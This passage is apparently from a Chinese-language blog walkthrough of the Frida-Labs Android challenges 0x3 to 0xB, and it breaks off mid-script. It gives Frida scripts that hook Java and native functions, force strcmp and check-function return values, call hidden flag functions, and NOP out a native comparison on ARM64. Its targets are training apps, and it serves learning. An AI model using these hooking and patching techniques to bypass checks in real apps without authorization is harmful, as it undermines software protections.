class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);</span><br><span class="line">    a.<span class="property">code</span>.<span class="property">value</span> = <span class="number">0x200</span>;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h2 id="Frida-0x4"><a href="#Frida-0x4" class="headerlink" title="Frida 0x4"></a>Frida 0x4</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032026239.png" alt="image-20251203202613186"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032025808.png" alt="image-20251203202555760"></p><p>没有对类实例化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> check = a.$new();</span><br><span class="line">    <span class="keyword">var</span> flag = check.<span class="title function_">get_flag</span>(<span class="number">0x539</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;flag: &quot;</span>,flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x5"><a href="#Frida-0x5" class="headerlink" title="Frida 0x5"></a>Frida 0x5</h2><p>与上题不同，已经初始化了这个实例</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032030264.png" alt="image-20251203203001191"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x5.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            instance.<span class="title function_">flag</span>(<span class="number">1337</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x6"><a href="#Frida-0x6" class="headerlink" title="Frida 0x6"></a>Frida 0x6</h2><p>接受一个对象实例化</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032043574.png" alt="image-20251203204332491"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032043992.png" alt="image-20251203204341947"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_6</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x6.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> C_New = checker.$new();</span><br><span class="line">            C_New.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">0x4D2</span>;</span><br><span class="line">            C_New.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">0x10E1</span>;</span><br><span class="line"></span><br><span class="line">            instance.<span class="title function_">get_flag</span>(C_New);        </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x7"><a href="#Frida-0x7" class="headerlink" title="Frida 0x7"></a>Frida 0x7</h2><p>与上题不同的是</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032045843.png" alt="image-20251203204502792"></p><p>法一，同上题，无非是多了个构造函数，我们按构造函数传参即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_7</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x7.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> C_New = checker.$new(<span class="number">0x201</span>,<span class="number">0x201</span>);</span><br><span class="line">            instance.<span class="title function_">flag</span>(C_New);        </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>法2：hook构造函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_7_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">    a.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">param</span>)&#123; </span><br><span class="line">        <span class="variable language_">this</span>.$init(<span class="number">0x201</span>,<span class="number">0x201</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x8"><a href="#Frida-0x8" class="headerlink" title="Frida 0x8"></a>Frida 0x8</h2><p>cmpstr来自so层</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032058323.png" alt="image-20251203205838224"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032100385.png" alt="image-20251203210004300"></p><p>可以看到Java_com_ad2001_frida0x8_MainActivity_cmpstr中获取了我们的输入，并将这段输入使用strcmp函数与一段密文s2进行比较，当它们相等时，将会返回0</p><p>所以我们可以直接hook strcmp函数，输出他的两个参数，第二个参数就是密文了</p><p>需要输入Closure</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">i, i2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;check is called&#x27;</span> + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i: &#x27;</span> + i + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i2: &#x27;</span> + i2);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">check</span>(<span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="title function_">get_flag</span>(<span class="number">4919</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_3</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">Checker</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);</span><br><span class="line">    <span class="title class_">Checker</span>.<span class="property">code</span>.<span class="property">value</span> = <span class="number">0x200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_4</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> check = a.$new();</span><br><span class="line">    <span class="keyword">var</span> flag = check.<span class="title function_">get_flag</span>(<span class="number">0x539</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;flag: &quot;</span>,flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x5.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            instance.<span class="title function_">flag</span>(<span class="number">1337</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_6</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x6.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> C_New = checker.$new();</span><br><span class="line">            C_New.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">0x4D2</span>;</span><br><span class="line">            C_New.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">0x10E1</span>;</span><br><span class="line"></span><br><span class="line">            instance.<span class="title function_">get_flag</span>(C_New);        </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_7</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x7.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> C_New = checker.$new(<span class="number">0x201</span>,<span class="number">0x201</span>);</span><br><span class="line">            instance.<span class="title function_">flag</span>(C_New);        </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_7_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">    a.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">param</span>)&#123; </span><br><span class="line">        <span class="variable language_">this</span>.$init(<span class="number">0x201</span>,<span class="number">0x201</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">frida_8</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//枚举所有导出函数</span></span><br><span class="line">    <span class="keyword">var</span> all_0x8_exp = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libfrida0x8.so 所有导出函数：\n&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(all_0x8_exp, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从lib中寻找指定函数的地址，若不知道lib名称可以传NULL，找不到会抛出异常</span></span><br><span class="line">    <span class="keyword">var</span> cmpstr_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> strcmp_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> strcmp_null_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;strcmp&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\ncmpstr_addr:&quot;</span>,cmpstr_addr);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;strcmp_addr:&quot;</span>,strcmp_addr);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;strcmp_null_addr:&quot;</span>,strcmp_null_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//功能与getExportByName相同，找不到返回null</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Closure</span>_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Closure&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Closure_addr:&quot;</span>,<span class="title class_">Closure</span>_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取基地址</span></span><br><span class="line">    <span class="keyword">var</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc_base:&quot;</span>,libc_base);</span><br><span class="line">    <span class="keyword">var</span> libc_base_add_cmpstr = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x8c0</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc_base_add_cmpstr:&quot;</span>,libc_base_add_cmpstr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取所有导入</span></span><br><span class="line">    <span class="keyword">var</span> all_0x8_imp = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libfrida0x8.so 所有导入函数：\n&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(all_0x8_imp, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> strcmp_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> out_put; <span class="comment">//全局变量，接收第一个参数</span></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(strcmp_addr, &#123; <span class="comment">//将回调附加到指定的函数地址</span></span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123; <span class="comment">//进入回调函数时调用</span></span><br><span class="line">            <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">0</span>]); </span><br><span class="line">            <span class="keyword">var</span> flag = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">1</span>]);</span><br><span class="line">            out_put = arg0;</span><br><span class="line">            <span class="keyword">if</span> (arg0.<span class="title function_">includes</span>(<span class="string">&quot;Closure&quot;</span>)) &#123; <span class="comment">//过滤器</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[0]: &quot;</span>,arg0);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[1]: &quot;</span>,flag);</span><br><span class="line">            &#125;</span><br><span class="line">                    </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123; <span class="comment">//退出后调用</span></span><br><span class="line">            <span class="keyword">if</span> (out_put.<span class="title function_">includes</span>(<span class="string">&quot;Closure&quot;</span>)) &#123; <span class="comment">//过滤器，根据第一个参数的值，防止修改所有的strcmp</span></span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">0</span>); <span class="comment">//返回0</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">frida_8</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Frida-0x9"><a href="#Frida-0x9" class="headerlink" title="Frida 0x9"></a>Frida 0x9</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032111233.png" alt="image-20251203211113158"></p><p>checkflag返回1</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032111377.png" alt="image-20251203211138241"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_9</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> flag_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;liba0x9.so&quot;</span>, <span class="string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(flag_addr, &#123; </span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123; </span><br><span class="line">                    </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123; </span><br><span class="line">            retval.<span class="title function_">replace</span>(<span class="number">0x539</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0xA"><a href="#Frida-0xA" class="headerlink" title="Frida 0xA"></a>Frida 0xA</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032119782.png" alt="image-20251203211958615"></p><p>没有什么，但是so层有个get_flag需要主动调用才能输出flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_A</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> get_flag_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>,<span class="string">&quot;get_flag&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get_flag_addr:&quot;</span>,get_flag_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//主动调用一个没有被导入的函数需要通过基地址+偏移的方式</span></span><br><span class="line">    <span class="keyword">var</span> get_flag_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x206B0</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get_flag_addr:&quot;</span>,get_flag_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建NativePointer对象</span></span><br><span class="line">    <span class="keyword">var</span> get_flag_ptr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(get_flag_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建NativeFunction对象，参数为NativePointer对象，返回类型，原函数参数</span></span><br><span class="line">    <span class="keyword">const</span> get_flag = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(get_flag_ptr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">    <span class="title function_">get_flag</span>(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">//主动调用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">frida_A</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Frida-0xB"><a href="#Frida-0xB" class="headerlink" title="Frida 0xB"></a>Frida 0xB</h2><p>程序加载了frida0xb库，引用getFlag函数，点击按钮将调用getFlag函数：</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032132242.png" alt="image-20251203213240071"></p><p>定位到getflag</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032134447.png" alt="image-20251203213423304"></p><p>能看到在汇编中对比了0xDEADBEEF和0x539，这当然是不相等的</p><p>程序将会直接返回，我们需要让getFlag执行关于flag的相关代码，将JNZ改为JMP或者修改0xDEADBEEF为0x539，或者nop掉相关校验逻辑</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032210148.png" alt="image-20251203221012066"></p><p>nop完为</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032210623.png" alt="image-20251203221003539"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032210911.png" alt="image-20251203221034830"></p><p>我这是Arm架构的使用Arm64Writer(真机)</p><p>x86_64可以看<a href="https://zh-closure.github.io/2024/07/12/%E9%80%9A%E8%BF%87Frida-Labs%E5%85%A5%E9%97%A8Frida/#Frida-0xB">通过Frida-Labs入门Frida | Closure</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_B</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> soName = <span class="string">&quot;libfrida0xb.so&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(soName);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arch:&quot;</span>, <span class="title class_">Process</span>.<span class="property">arch</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;base:&quot;</span>, base);</span><br><span class="line">    <span class="keyword">var</span> offset = <span class="number">0x15248</span>;</span><br><span class="line">    <span class="keyword">var</span> target = base.<span class="title function_">add</span>(offset);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;patch addr:&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 看一下原来是什么指令</span></span><br><span class="line">    <span 